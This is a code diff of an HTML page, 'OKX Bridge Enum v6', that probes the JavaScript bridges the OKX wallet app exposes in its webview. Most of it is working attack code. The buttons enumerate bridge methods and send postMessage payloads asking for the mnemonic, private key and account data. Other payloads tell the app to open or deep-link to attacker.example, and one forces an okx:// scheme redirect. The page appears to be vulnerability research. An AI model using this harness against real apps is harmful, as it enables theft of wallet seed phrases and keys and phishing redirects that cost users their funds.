@@ -1,35 +1,146 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BRIDGE_TEST</title>
-<style>body{font-family:monospace;font-size:14px;padding:8px;background:#fff;color:#000}
-.b{color:red;font-weight:bold}.g{color:green;font-weight:bold}.h{background:#ff0;padding:2px}</style>
-</head><body>
-<h2>OKX JS Bridge Enumeration</h2>
-<div id="out">scanning...</div>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BRIDGE_ENUM_v6</title>
+<style>
+body{font-family:monospace;font-size:12px;padding:6px;background:#fff;color:#000}
+button{padding:10px;margin:4px 0;font-size:13px;background:#0066cc;color:#fff;border:0;display:block;width:100%;border-radius:6px}
+.danger{background:#cc0000}
+.warn{background:#ff8800}
+.crit{background:#660000}
+pre{background:#eee;padding:4px;font-size:9px;white-space:pre-wrap;word-break:break-all;height:380px;overflow:auto;border:1px solid #999;margin:0}
+</style></head><body>
+<h2 style="margin:4px 0">OKX Bridge Enum v6</h2>
+<pre id="out">click a button</pre>
+<button onclick="enumBridge('okxInternalJSBridge')">[E1] okxInternalJSBridge</button>
+<button onclick="enumBridge('native')" class="crit">[E2] native</button>
+<button onclick="enumBridge('interception')" class="crit">[E3] interception</button>
+<button onclick="enumBridge('AndroidApi')">[E4] AndroidApi</button>
+<button onclick="enumBridge('JSInterface')">[E5] JSInterface</button>
+<button onclick="enumBridge('OSAndroid')">[E6] OSAndroid</button>
+<button onclick="callOkxInternal()" class="danger">[C1] okxInternalJSBridge sensitive payloads</button>
+<button onclick="callNativeRaw()" class="crit">[C2] native sensitive payloads</button>
+<button onclick="callInterception()" class="crit">[C3] interception sensitive payloads</button>
+<button onclick="enumWallet()">[W] okxwallet chain enum</button>
+<button onclick="testSchemeRedirect()" class="danger">[L] location.href = okx://app/web?url=...</button>
+<p style="font-size:10px">URL: <span id="u" style="background:#ff0"></span></p>
+
 <script>
-var bridges = ["_solana_","_aptos_","_okx_sui_","tron","native",
-"okxInternalJSBridge","okxOsmosJSBridge","okxStarkJSBridge",
-"okxBtcJSBridge","okxNostrJSBridge","okxTonJSBridge",
-"okxwallet","ethereum","solana","tronWeb","aptos","sui","ton"];
+document.getElementById("u").textContent = location.href;
 var out = document.getElementById("out");
-var html = "<p>UA: <span class=h>"+navigator.userAgent+"</span></p>";
-html += "<p>URL: <span class=h>"+location.href+"</span></p>";
-html += "<table border=1 cellpadding=4>";
-html += "<tr><th>Bridge</th><th>Present</th><th>Type</th><th>Methods</th></tr>";
-bridges.forEach(function(b){
-  var v = window[b];
-  var present = (typeof v !== "undefined" && v !== null);
-  var t = typeof v;
-  var methods = "";
-  if(present){
+function log(t){ out.textContent = (new Date().toISOString().substr(11,12)) + " " + t + "\n" + out.textContent; }
+
+function enumBridge(name){
+  try{
+    var b = window[name];
+    if(!b){ log(name + ": MISSING"); return; }
+    log(name + " typeof=" + typeof b);
+    var keys=[]; for(var k in b){ keys.push(k); }
+    log("  for-in: " + keys.slice(0,40).join(","));
+    log("  Object.keys: " + Object.keys(b||{}).slice(0,30).join(","));
+    log("  ownProps: " + Object.getOwnPropertyNames(b||{}).slice(0,30).join(","));
+    var proto = Object.getPrototypeOf(b);
+    if(proto && proto !== Object.prototype){
+      var pProps = Object.getOwnPropertyNames(proto);
+      log("  proto props: " + pProps.slice(0,30).join(","));
+    }
+    var methods=["postMessage","sendMessage","invoke","invokeMethod","invokeNative","call","callNative","exec","execute","getInfo","getAccount","getAccounts","getAddress","getAddresses","getPubKey","getPublicKey","getBalance","getSeed","getMnemonic","getPrivateKey","getKey","getWalletInfo","getUserInfo","sign","signMessage","signTransaction","sendTransaction","openUrl","redirect","launch","close","copyToClipboard","getClipboardContent","openCamera","saveImage","share"];
+    var found=[];
+    for(var m of methods){
+      try{ if(typeof b[m] === "function") found.push(m); }catch(e){}
+    }
+    log("  callable common: [" + found.join(",") + "]");
+  }catch(e){ log(name + " ERROR: " + e.message); }
+}
+
+function callOkxInternal(){
+  var b = window.okxInternalJSBridge;
+  if(!b){ log("no okxInternalJSBridge"); return; }
+  if(typeof b.postMessage !== "function"){ log("no postMessage on okxInternalJSBridge"); return; }
+  var payloads = [
+    {id:1,name:"getUserInfo",object:{}},
+    {id:2,name:"getWalletInfo",object:{}},
+    {id:3,name:"getAccount",object:{}},
+    {id:4,name:"getMnemonic",object:{}},
+    {id:5,name:"getPrivateKey",object:{}},
+    {id:6,name:"openUrl",object:{url:"https://attacker.example/"}},
+    {id:7,name:"navigate",object:{url:"okx://app/main"}},
+    {id:8,name:"deeplink",object:{url:"okx://wallet/dapp/details?dappUrl=https://attacker.example"}},
+    {id:9,name:"openDapp",object:{url:"https://attacker.example/"}},
+    {id:10,name:"copyToClipboard",object:{text:"test"}},
+  ];
+  for(var p of payloads){
     try{
-      var keys = [];
-      for(var k in v){ keys.push(k); }
-      methods = keys.slice(0,15).join(",");
-    }catch(e){methods="ERR:"+e.message;}
+      var r = b.postMessage(JSON.stringify(p));
+      log("[okxInt." + p.name + "] -> " + JSON.stringify(r||"undef"));
+    }catch(e){ log("[okxInt." + p.name + "] ERR: " + e.message); }
   }
-  var cls = present ? "g" : "b";
-  html += "<tr><td>"+b+"</td><td class="+cls+">"+(present?"YES":"NO")+"</td><td>"+t+"</td><td style='font-size:10px;max-width:300px;word-break:break-all'>"+methods+"</td></tr>";
-});
-html += "</table>";
-out.innerHTML = html;
+}
+
+function callNativeRaw(){
+  var b = window.native;
+  if(!b){ log("no window.native"); return; }
+  log("native typeof=" + typeof b);
+  if(typeof b.postMessage === "function"){
+    var payloads = [
+      "getUserInfo",
+      JSON.stringify({name:"getUserInfo"}),
+      JSON.stringify({id:1,name:"getMnemonic",object:{}}),
+      JSON.stringify({id:2,name:"openUrl",object:{url:"https://attacker.example/"}}),
+      JSON.stringify({type:"navigate",url:"okx://wallet/dapp/details?dappUrl=https://attacker.example"}),
+    ];
+    for(var p of payloads){
+      try{
+        var r = b.postMessage(p);
+        log("native.postMessage('" + p.substring(0,40) + "...') -> " + JSON.stringify(r||"undef"));
+      }catch(e){ log("native.postMessage ERR: " + e.message); }
+    }
+  }
+  // Try direct method calls
+  for(var m of ["invoke","exec","call","openUrl","getUserInfo","getMnemonic"]){
+    try{
+      if(typeof b[m] === "function"){
+        var r = b[m]("test");
+        log("native." + m + "('test') -> " + JSON.stringify(r||"undef"));
+      }
+    }catch(e){ log("native." + m + " ERR: " + e.message); }
+  }
+}
+
+function callInterception(){
+  var b = window.interception;
+  if(!b){ log("no window.interception"); return; }
+  log("interception typeof=" + typeof b);
+  // Probe common method names
+  var methods=["postMessage","intercept","onUrl","shouldIntercept","onLoadUrl","onPageStarted","onPageFinished","getMethods","invoke","navigate"];
+  for(var m of methods){
+    try{
+      if(typeof b[m] === "function"){
+        var r = b[m]("https://attacker.example/");
+        log("interception." + m + " -> " + JSON.stringify(r||"undef"));
+      }
+    }catch(e){ log("interception." + m + " ERR: " + e.message); }
+  }
+}
+
+function enumWallet(){
+  try{
+    var ow = window.okxwallet;
+    if(!ow){ log("no okxwallet"); return; }
+    var chains = ["solana","bitcoin","fractalBitcoin","bitcoinTestnet","aptos","sui","ton","tron","starknet","nostr","osmosis","cosmos"];
+    for(var c of chains){
+      var x = ow[c];
+      if(x){
+        var keys = Object.keys(x);
+        var fns = keys.filter(k => { try{return typeof x[k]==='function';}catch(e){return false;}});
+        log("ow." + c + ": " + keys.length + " keys, fns=[" + fns.slice(0,15).join(",") + "]");
+      }
+    }
+  }catch(e){ log("ERR: " + e.message); }
+}
+
+function testSchemeRedirect(){
+  try{
+    log("location.href = okx://app/web?url=https://attacker.example");
+    location.href = "okx://app/web?url=https%3A%2F%2Fattacker.example%2F";
+  }catch(e){ log("ERR: " + e.message); }
+}
 </script></body></html>
